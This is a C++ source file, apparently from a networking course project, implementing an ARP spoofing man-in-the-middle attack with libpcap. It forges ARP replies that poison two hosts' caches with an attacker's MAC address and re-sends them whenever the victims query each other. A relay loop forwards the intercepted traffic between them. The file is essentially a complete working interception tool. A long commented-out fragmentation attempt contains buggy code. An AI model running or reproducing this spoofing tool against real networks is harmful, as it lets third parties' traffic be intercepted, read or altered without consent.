#pragma once
#include "pch.h"
int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_mac, u_int8_t *sender_mac, u_int8_t *sender_ip, u_int8_t *target_mac, u_int8_t *target_ip, int type)
{
    EthArpPacket packet;

    // memcpy(packet.eth_.dmac_, dest_mac, 6);
    // memcpy(packet.eth_.smac_, source_mac, 6);
    copy_mac(dest_mac, packet.eth_.dmac_);
    copy_mac(source_mac, packet.eth_.smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = 6;
    packet.arp_.pln_ = 4;

    // packet.arp_.op_ = type;
    if (type == 0)
    {
        packet.arp_.op_ = htons(ArpHdr::Request);
    }
    else if (type == 1)
    {
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    else
    {
        printf("case 0 is sending request, case 1 is sending reply\n");
        return -1;
    }

    // memcpy(packet.arp_.smac_, sender_mac, 6);
    // memcpy(packet.arp_.sip, sender_ip, 4);
    copy_mac(sender_mac, packet.arp_.smac_);
    copy_ip(sender_ip, packet.arp_.sip);

    // memcpy(packet.arp_.tmac_, target_mac, 6);
    // memcpy(packet.arp_.tip, target_ip, 4);
    copy_mac(target_mac, packet.arp_.tmac_);
    copy_ip(target_ip, packet.arp_.tip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return -1;
    }
    return 0;
}

int reply(const char *dev, pcap_t *pcap, u_int8_t *mac, u_int8_t *ip)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    while (1)
    {
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res != 1)
        {
            printf("error!\n");
            return -1;
        }
        EthArpPacket *arppkt;
        arppkt = (EthArpPacket *)packet;

        // if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && (memcmp(arppkt->arp_.sip, ip, 4) == 0))
        if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && if_same_ip(arppkt->arp_.sip, ip))
        {
            copy_mac(arppkt->arp_.smac_, mac);
            // memcpy(mac, arppkt->arp_.smac_, 6);
            break;
        }
    }
    return 0;
}

int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sender_mac, u_int8_t *target_mac, u_int8_t *sender_ip, u_int8_t *target_ip)
{
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        EthArpPacket *pkt;
        TcpIpPacket *ip_pkt;
        pkt = (EthArpPacket *)packet;
        ip_pkt = (TcpIpPacket *)packet;
        int size_of_data;
        int offset = 0;

        u_int sendsize;
        u_char data[1500];
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, target_mac)) && (if_same_ip(pkt->arp_.tip, sender_ip)))
        {
            printf("where is sender?\n");
            request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
            continue;
        }

        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, sender_mac)) && (if_same_ip(pkt->arp_.tip, target_ip)))
        {
            printf("where is target?\n");
            request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
            continue;
        }

        if (if_same_mac(pkt->eth_.smac_, sender_mac))
        {
            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
            {
                // memcpy(pkt->eth_.dmac_, target_mac, 6);
                // memcpy(pkt->eth_.smac_, attacker_mac, 6);
                copy_mac(target_mac, pkt->eth_.dmac_);
                copy_mac(attacker_mac, pkt->eth_.smac_);

                int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                if (res != 0)
                {
                    printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                    return -1;
                }
            }
        }
        else if (if_same_mac(pkt->eth_.smac_, target_mac))
        {
            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
            {
                copy_mac(sender_mac, pkt->eth_.dmac_);
                copy_mac(attacker_mac, pkt->eth_.smac_);

                int i = 0;
                sendsize = header->len;
                //단위 1440
                // 1440 + 34 == 1474
                printf("sendsize1 : %d\n", sendsize);
                // while (sendsize > 1474)
                // {
                //     ip_pkt->ip_.ip_len = htons(1460);
                //     ip_pkt->ip_.ip_offset = htons((180 * i) | 0b0010000000000000);
                //     memcpy(pkt + 34, data + 1440 * i, 1440);
                //     int res = pcap_sendpacket(pcap, (u_char *)pkt, 1474);
                //     if (res != 0)
                //     {
                //         printf("long!!\n");
                //         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                //         return -1;
                //     }
                //     sendsize -= 1440;
                //     i++;
                // }
                // sendsize = header->len - 400 * i;

                // while (sendsize > 1474)
                // {
                //     ip_pkt->ip_.ip_len = htons(1460);
                //     ip_pkt->ip_.ip_offset = htons((180 * i) | 0b0010000000000000);
                //     memcpy(pkt + 34, data + 1440 * i, 1440);
                //     int res = pcap_sendpacket(pcap, (u_char *)pkt, 1474);
                //     if (res != 0)
                //     {
                //         printf("long!!\n");
                //         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                //         return -1;
                //     }
                //     sendsize -= 1440;
                //     i++;
                // }
                // sendsize = header->len - 400 * i;
                printf("sendsize2 : %d\n", sendsize);
                int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                // int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
                if (res != 0)
                {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                    return -1;
                }
                // size_of_data = ntohs(ip_pkt->ip_.ip_len) - 20;
                //  memcpy(data, packet + 34, size_of_data);

                //단위 400
                // 434
                // int i = 0;
                // while (size_of_data > 400)
                // {
                //     printf("size of data : %d\n", size_of_data);
                //     sendsize = 434;
                //     ip_pkt->ip_.ip_len = htons(420);
                //     ip_pkt->ip_.ip_offset = htons((50 * i) | 0b0010000000000000);
                //     memcpy(pkt + 34, data + 400 * i, 400);
                //     int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
                //     if (res != 0)
                //     {
                //         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                //         return -1;
                //     }
                //     size_of_data -= 400;
                //     i++;
                // }
                // sendsize = header->len - 400 * i;

                // ip_pkt->ip_.ip_len = htons(sendsize - 14);
                // ip_pkt->ip_.ip_offset = 0;
                //  memcpy(pkt->eth_.dmac_, sender_mac, 6);
                //  memcpy(pkt->eth_.smac_, attacker_mac, 6);
            }
        }
    }
    return 0;
}
